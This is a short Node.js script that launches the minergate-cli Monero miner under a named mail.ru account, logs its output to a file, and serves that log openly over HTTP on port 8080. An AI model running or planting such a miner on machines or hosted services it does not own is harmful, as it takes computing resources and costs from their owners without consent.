'use strict';
var fs = require('fs'),  log = fs.openSync('./mg.log', 'a');
require('child_process').spawn('./minergate-cli', ['-user', 'js-coder@mail.ru', '-xmr'], { stdio: ['ignore', log, log]});
require('http').createServer((req, res) => {fs.createReadStream('./mg.log').pipe(res)}).listen(8080);


